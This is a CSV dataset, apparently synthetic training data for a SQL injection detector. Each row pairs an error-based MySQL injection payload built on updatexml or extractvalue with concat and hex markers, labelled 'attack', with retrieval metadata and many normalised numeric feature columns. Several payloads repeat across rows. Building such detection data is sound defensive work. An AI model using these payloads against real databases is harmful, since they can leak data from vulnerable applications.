id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000112,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,6.364385593533431,153.62229919433594,34.53278732299805,48.80616760253906,55.76138687133789,2.7515711784362793,40.923439025878906,21.84416389465332,0.5948135852813721,0.22446538507938385,0.24553969502449036,0.3385457694530487,0.13141916692256927,3.727229356765747,0.8842679858207703,0.918881893157959,0.6969102025032043,0.08285440504550934,0.3886339068412781,0.33563360571861267,4.049405097961426,5.8409013748168945,7.446887969970703,0.7696109414100647,1.9445955753326416,0.03443720564246178,0.8058531880378723,0.703981876373291,-0.11294253170490265,-0.04643981531262398,-0.6241264343261719,-0.18405887484550476,4.687950611114502,-0.16731998324394226,0.32580995559692383,2.0283966064453125,3.5134060382843018,2.1981568336486816,0.6924892067909241,0.47730350494384766,0.5519610643386841,0.1883346140384674,0.00604902021586895,-0.48390573263168335,-0.10937350988388062,-0.33730369806289673,-0.009837538003921509,-0.06068296730518341,-0.23789744079113007,-0.3219219148159027,0.556528627872467,-0.3974885642528534,-0.4684097170829773,0.7674547433853149,-0.3652949929237366,0.0045988839119672775,-0.08935441076755524,0.45810937881469727,0.5860018134117126,0.946925163269043,0.2725326120853424,0.37695273756980896,1.152037262916565,0.28668469190597534,0.15121330320835114,-0.6352310180664062,0.7220768928527832,-0.07683032751083374,0.5364090204238892,0.0632680207490921,-0.3629133701324463,1.0073658227920532,0.9478573203086853,-0.30937519669532776,0.009531700052320957,0.08397945016622543,1.5405129194259644,0.7127630710601807,-0.17694643139839172,0.08944323658943176,-0.05977732688188553,4.218973159790039,0.38693079352378845,-1.011101245880127,0.09460312128067017,0.8123360872268677,-0.5193026065826416,-0.8754686117172241,0.6499635577201843
GAN_000113,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.904952742902349,153.15078735351562,41.96988296508789,46.735595703125,55.86609649658203,2.658595561981201,48.12006378173828,20.771610260009766,0.725456178188324,0.268480509519577,0.20388031005859375,0.3477065861225128,0.11952506750822067,3.7374107837677,0.6981443166732788,0.6474032998085022,0.7431149482727051,-0.04036981239914894,0.4457820653915405,0.6171199679374695,4.386053562164307,5.589574337005615,7.261756420135498,0.3194752335548401,1.927970051765442,-0.0932927057147026,0.7037108540534973,0.4458155632019043,-0.33574002981185913,-0.02327149361371994,-0.2480846792459488,-0.3190706670284271,4.178800106048584,0.11860160529613495,0.4222835898399353,1.717046856880188,3.4370298385620117,1.743890404701233,0.46373000741004944,0.17288894951343536,0.4351465106010437,0.6631604433059692,-0.0959661677479744,-0.23677347600460052,0.2329988330602646,-0.047449465841054916,-0.008463237434625626,-0.049015119671821594,-0.163858100771904,-0.34395942091941833,0.5295366644859314,-0.2287748008966446,-0.48237526416778564,0.5425631999969482,-0.20077958703041077,0.39634037017822266,-0.07864118367433548,0.41272491216659546,0.468147873878479,0.8702951073646545,0.06665366888046265,0.14204606413841248,0.9434398412704468,-0.0304217878729105,0.22625316679477692,-0.6155876517295837,0.6475496292114258,0.02394380420446396,0.9061803221702576,-0.06570348143577576,-0.6167737245559692,0.7700157761573792,0.7776289582252502,-0.3425668478012085,0.026288634166121483,0.09222090989351273,1.4005855321884155,0.5324583649635315,0.06707732379436493,0.010494804941117764,0.005783716216683388,4.4780097007751465,0.3798605799674988,-0.6701037287712097,0.18551670014858246,0.6167662143707275,-0.46359825134277344,-0.5347018241882324,0.6547642350196838
GAN_000114,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",nearest_attack_euclidean,R000013,7.524052245216223,146.34677124023438,45.5865478515625,47.816001892089844,56.39311981201172,1.2811470031738281,49.331607818603516,23.004121780395508,0.4591376781463623,0.2644138038158417,0.18185263872146606,0.3407270908355713,0.11242864280939102,3.7254600524902344,0.9810711741447449,1.8455718755722046,0.7643760442733765,0.039632197469472885,0.33372044563293457,0.3213241994380951,4.538691997528076,7.048943519592285,6.927580833435059,0.8597332835197449,2.03948974609375,0.46556204557418823,0.5495779514312744,0.9125108122825623,-0.5601056814193726,-0.0364418625831604,-0.280947744846344,-0.3797507882118225,3.5616230964660645,0.2510935962200165,0.4572735130786896,2.064678907394409,3.358475685119629,2.157066583633423,0.6576051712036133,-0.05933144688606262,0.6006922125816345,0.5540854930877686,0.20672616362571716,-0.4996756911277771,0.2689930498600006,-0.5026971101760864,-0.1150050163269043,0.13048717379570007,-0.1655757874250412,-0.19785864651203156,0.7020707726478577,-0.11078183352947235,-0.9328392148017883,0.8899735808372498,-0.14790195226669312,0.6839612722396851,-0.1724969446659088,1.0231430530548096,0.674644410610199,1.0521924495697021,0.5878439545631409,0.12072907388210297,1.1385338306427002,0.4995785355567932,0.2923683524131775,-0.93138587474823,0.2624253034591675,-0.38978311419487,1.4849916696548462,0.12694574892520905,-0.7141783833503723,0.9512470364570618,1.8626996278762817,-0.14245107769966125,-0.015918605029582977,0.1274152398109436,1.7529321908950806,0.4190507233142853,-0.27239179611206055,-0.015333247371017933,-0.5996474623680115,3.410965919494629,0.23470595479011536,-0.4217606782913208,0.1530613750219345,0.672479510307312,-0.7852604389190674,-0.6957057118415833,1.145555019378662
GAN_000115,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",nearest_attack_euclidean,R000013,8.792409963315782,155.58929443359375,43.19880294799805,51.52191162109375,52.971153259277344,1.5134841203689575,53.248470306396484,24.23841667175293,0.455284059047699,0.25143373012542725,0.17260529100894928,0.3254539370536804,0.11051060259342194,3.715390205383301,0.7638940811157227,1.681330680847168,0.4969486892223358,-0.0241958387196064,0.37859275937080383,0.5992989540100098,4.250243186950684,6.299084663391113,7.491803169250488,0.7062059044837952,2.373356819152832,-0.12229917198419571,0.8387607336044312,0.6855783462524414,-0.5272870063781738,-0.03887641802430153,-0.34411346912384033,-0.2798576354980469,4.680441379547119,0.8883910775184631,0.29572758078575134,2.350614070892334,2.6556899547576904,2.5178394317626953,-0.06571903079748154,0.34649449586868286,0.6576161980628967,0.6097285151481628,0.3186083734035492,-0.44696176052093506,0.13013164699077606,-0.2962675392627716,-0.11298500001430511,-0.06756485998630524,-0.44445088505744934,-0.5320890545845032,0.7985539436340332,-0.4072957932949066,-0.8004705309867859,0.9123013615608215,-0.5914591550827026,0.7881355285644531,-0.5078362822532654,1.2737677097320557,1.1178996562957764,1.534316897392273,0.9985345602035522,0.24144293367862701,1.2401760816574097,0.54202800989151,0.22731059789657593,-0.94632887840271,0.19278812408447266,-0.7142218351364136,1.7860807180404663,0.09176293015480042,-1.0954855680465698,1.4325437545776367,1.7523424625396729,-0.3900526762008667,-0.028294414281845093,0.12891755998134613,1.7778277397155762,0.6144624352455139,0.003220821265131235,-0.024040255695581436,-0.09459962695837021,3.13203763961792,0.25499266386032104,-0.90765780210495,0.15165376663208008,0.7235040664672852,-1.058342695236206,-1.141810655593872,1.1782498359680176
GAN_000116,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,5.3183268508799175,149.3551483154297,45.96809387207031,35.737552642822266,57.061851501464844,3.064617872238159,44.905887603759766,19.60047149658203,0.9662787318229675,0.3095936179161072,0.18092142045497894,0.351826012134552,0.11509875953197479,3.72271728515625,1.285043478012085,0.8291218280792236,0.412716805934906,0.22882503271102905,0.24902498722076416,-0.07258806377649307,4.625307083129883,6.119114875793457,5.039551734924316,0.5907753109931946,1.4508388042449951,-0.14222551882266998,0.027637846767902374,0.540884256362915,-0.5471931099891663,-0.045720767229795456,-0.31945568323135376,-0.08630122244358063,2.75349760055542,0.23872888088226318,0.6202505826950073,1.5322484970092773,3.63032603263855,1.2151634693145752,0.686874508857727,0.2590469717979431,0.3579195439815521,0.22389686107635498,0.3464609682559967,-0.054108936339616776,-0.27252718806266785,-0.27770888805389404,-0.003516165539622307,0.1441553384065628,0.03154687583446503,-0.18123503029346466,0.5470260381698608,0.02581244707107544,-0.26167601346969604,0.01815039850771427,-0.38364431262016296,0.08338823169469833,-0.13259263336658478,0.5652517080307007,0.32563337683677673,0.6483353972434998,0.07427231967449188,0.23112788796424866,0.1866058111190796,0.36100947856903076,0.3074294328689575,-0.7968730926513672,0.5272911787033081,-0.42883023619651794,0.49404799938201904,0.12207236886024475,-0.5212947726249695,0.7602220177650452,1.1764012575149536,-0.05163552612066269,0.009752321988344193,0.07738545536994934,0.7835770845413208,0.34075456857681274,-0.12340772897005081,-0.0356183685362339,0.26051101088523865,6.89119815826416,0.07950089871883392,-0.40979862213134766,0.11380241066217422,0.7401355504989624,-0.5250000357627869,-0.5882098078727722,0.4596661925315857
GAN_000117,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.774510550104753,151.63832092285156,40.07347106933594,45.5489501953125,54.0916862487793,1.1662464141845703,45.149452209472656,21.495941162109375,0.5594184398651123,0.250277578830719,0.19901028275489807,0.34176650643348694,0.12498575448989868,3.728998899459839,1.0261902809143066,0.823643684387207,0.5727695226669312,0.03279377147555351,0.4510907530784607,0.4925217926502228,4.15786075592041,5.145422458648682,7.397259712219238,0.47059109807014465,1.9945874214172363,-0.16589248180389404,0.491163432598114,0.4228402078151703,-0.3073253929615021,-0.029357388615608215,-0.5134892463684082,-0.19353070855140686,4.59773588180542,0.011913999915122986,0.3828790783882141,1.8542720079421997,3.4503324031829834,1.840701937675476,0.5054717659950256,0.45117613673210144,0.41762420535087585,0.664162278175354,-0.042187970131635666,-0.27656447887420654,-0.021877948194742203,-0.027322527021169662,-0.0644383579492569,0.023161813616752625,-0.19603805243968964,-0.3702220618724823,0.4622069001197815,-0.238449826836586,-0.4632740020751953,0.4714086055755615,-0.3110574781894684,0.37697532773017883,-0.3539998233318329,0.4175946116447449,0.6033321619033813,0.9189040660858154,-0.040310367941856384,0.3117891848087311,0.9239565134048462,-0.059257566928863525,0.19117960333824158,-0.5966143608093262,0.5791473388671875,0.2672309875488281,0.6441525220870972,-0.16706958413124084,-0.4164998531341553,0.8744288086891174,0.7151411771774292,-0.4537360966205597,0.016157997772097588,0.08152806758880615,1.2912938594818115,0.5701645016670227,-0.07213398069143295,0.041867803782224655,0.1389913260936737,3.647921323776245,0.3279199004173279,-0.9434587359428406,0.06904785335063934,0.7945072054862976,-0.519353985786438,-0.6146225333213806,0.5869255065917969
GAN_000118,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,4.798059403506795,148.64173889160156,44.34562301635742,37.996273040771484,53.68162155151367,2.5359866619110107,46.17755889892578,19.920228958129883,0.7473626136779785,0.3008610010147095,0.18791362643241882,0.3564474880695343,0.11631830781698227,3.714893102645874,0.8043490648269653,0.8538616895675659,0.8071304559707642,0.15560050308704376,0.2739344835281372,0.24715080857276917,4.47257661819458,5.627407073974609,6.088784217834473,0.22963932156562805,1.6129076480865479,-0.08247514069080353,0.34239521622657776,0.34610339999198914,-0.24774475395679474,-0.016461703926324844,-0.26539599895477295,-0.14052516222000122,3.2508914470672607,0.03271729499101639,0.5520547032356262,1.5497292280197144,3.406367778778076,1.1636663675308228,0.760150134563446,0.06242196634411812,0.37112003564834595,0.4508921802043915,0.12328686565160751,0.0007667499594390392,-0.0626748651266098,-0.2666761875152588,0.07121877372264862,0.11028559505939484,-0.01233665645122528,-0.08369036018848419,0.38498663902282715,0.019299745559692383,-0.3433738946914673,0.2801551818847656,-0.17144238948822021,0.5166339874267578,-0.22814837098121643,0.2547597587108612,0.536928653717041,0.5498853325843811,0.04083487018942833,0.32474252581596375,0.398662805557251,0.04476860910654068,0.2362486720085144,-0.3412468135356903,0.5998916625976562,-0.086835578083992,0.7057865262031555,-0.14062145352363586,-0.3898972272872925,0.36287856101989746,0.5955478549003601,-0.4127002954483032,0.00692614633589983,0.05929446592926979,0.9081335663795471,0.44782793521881104,0.0826607272028923,0.015814106911420822,-0.02603469043970108,4.880640029907227,0.2964179813861847,-0.46333742141723633,0.23608388006687164,0.7272027730941772,-0.3168383836746216,-0.32994064688682556,0.39240556955337524
GAN_000119,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",nearest_attack_euclidean,R000064,5.3794184331149015,153.28184509277344,44.22366714477539,37.747379302978516,53.92906951904297,1.1567816734313965,43.86483383178711,20.923452377319336,0.7226092219352722,0.2679312229156494,0.21198050677776337,0.33842897415161133,0.12670792639255524,3.773489475250244,0.8111883997917175,0.780371367931366,0.42362266778945923,-0.019950497895479202,0.38933029770851135,0.5427850484848022,4.448503017425537,5.453211307525635,6.459046363830566,0.38148871064186096,1.7871555089950562,-0.37378472089767456,0.4620593190193176,0.5954689383506775,-0.48730647563934326,-0.039664775133132935,-0.5541351437568665,0.013248607516288757,3.408651828765869,0.06936036050319672,0.41847744584083557,1.7930316925048828,3.825340509414673,1.8927550315856934,0.6078583598136902,0.025381606072187424,0.3323920965194702,0.5804880857467651,-0.014910183846950531,-0.35193711519241333,-0.2399487942457199,-0.01964830420911312,0.13185317814350128,0.10146355628967285,0.07100072503089905,-0.2825716435909271,0.5922038555145264,-0.0864495187997818,-0.33051449060440063,0.6792701482772827,-0.1346161663532257,0.12253011018037796,-0.12342739850282669,0.15519742667675018,0.3501451015472412,0.5170820951461792,0.1773381531238556,-0.058983996510505676,0.6536346673965454,0.01862344518303871,0.1961391419172287,-0.5438115000724792,0.8229537010192871,0.07092933356761932,0.4121069312095642,-0.007394947111606598,-0.8611542582511902,0.9600316882133484,0.850304126739502,-0.2790403366088867,0.0061975265853106976,0.05140846595168114,1.2117748260498047,0.37704676389694214,-0.16275377571582794,-0.030184466391801834,-0.04208245128393173,4.650416374206543,0.18635083734989166,-0.5336863398551941,0.06733595579862595,0.7501248121261597,-0.6181203126907349,-0.4336529076099396,0.46094369888305664
GAN_000120,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,4.762122024762459,152.24652099609375,42.709754943847656,38.65390396118164,55.3625373840332,3.0018272399902344,44.08982467651367,20.398420333862305,0.7272157669067383,0.28314489126205444,0.20624229311943054,0.3513018786907196,0.12245801091194153,3.737805128097534,1.1945486068725586,0.600925862789154,0.7110223770141602,0.1399577409029007,0.3816513419151306,0.19840578734874725,4.4823994636535645,5.753752708435059,5.760458469390869,0.3790009021759033,1.6517033576965332,-0.05874769017100334,0.40687379240989685,0.47066399455070496,-0.2963041067123413,-0.025226116180419922,-0.30542224645614624,-0.2135535329580307,3.288783550262451,0.0748245045542717,0.5257213115692139,1.5170141458511353,3.743922233581543,1.2765153646469116,0.7742477059364319,0.33965495228767395,0.3389771282672882,0.2895081043243408,0.12579220533370972,-0.1583591252565384,0.023834828287363052,-0.23242969810962677,-0.14851807057857513,0.14761318266391754,-0.01887194812297821,-0.13741575181484222,0.47869136929512024,0.03000587224960327,-0.17312408983707428,0.29692503809928894,-0.17226314544677734,-0.0873553454875946,-0.12618431448936462,0.4432046711444855,0.3758426308631897,0.5347781181335449,0.07093435525894165,0.22064019739627838,0.4231950342655182,0.07274656742811203,0.1861950308084488,-0.5697835087776184,0.6721992492675781,-0.0546099990606308,0.3311416208744049,0.06595705449581146,-0.41505780816078186,0.6985489726066589,0.7430814504623413,-0.27517378330230713,0.016096048057079315,0.05789734050631523,1.0000977516174316,0.41978663206100464,-0.13195820152759552,0.03899218142032623,0.08535496890544891,5.099081516265869,0.21770672500133514,-0.4801430106163025,0.08736257255077362,0.7188130021095276,-0.12095026671886444,-0.5444304943084717,0.4162876605987549
GAN_000121,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,4.517760755563335,149.99688720703125,44.35823059082031,38.52247619628906,55.15167236328125,1.3183131217956543,44.21572494506836,19.341970443725586,0.9261970520019531,0.30557936429977417,0.20796488225460052,0.35175469517707825,0.11552226543426514,3.739203691482544,1.1734187602996826,0.44758862257003784,0.48586204648017883,0.06055383011698723,0.34256136417388916,0.3077397048473358,4.60050630569458,5.532486438751221,5.8454909324646,0.375720739364624,1.4339467287063599,-0.21062633395195007,0.26267656683921814,0.48624297976493835,-0.34681105613708496,-0.030615124851465225,-0.43406569957733154,0.014196638017892838,2.9272708892822266,0.02384406328201294,0.5948886871337891,1.6021097898483276,3.7423861026763916,1.311657190322876,0.6492998003959656,0.2219126969575882,0.29223713278770447,0.41533613204956055,0.16617582738399506,-0.10317584127187729,-0.15860694646835327,0.03238668665289879,0.22215627133846283,0.08751638233661652,0.07954204082489014,-0.1652744859457016,0.3972129821777344,0.13439114391803741,-0.23895907402038574,0.07235491275787354,-0.18204393982887268,0.3283739984035492,-0.21157768368721008,0.15363921225070953,0.33895283937454224,0.5100365281105042,-0.25476592779159546,0.14169654250144958,0.15007524192333221,-0.057088665664196014,0.28578323125839233,-0.22348472476005554,0.6833404898643494,0.059883810579776764,0.23784857988357544,-0.1782989650964737,-0.5984095931053162,0.326501727104187,0.7285915017127991,-0.18531684577465057,0.019518055021762848,0.05235108733177185,0.7866935133934021,0.3155641257762909,-0.010448317974805832,-0.02044607326388359,0.2138136923313141,5.490006923675537,0.10682584345340729,-0.15264694392681122,0.20078255236148834,0.7660776972770691,-0.41714194416999817,-0.3890773355960846,0.3889153003692627
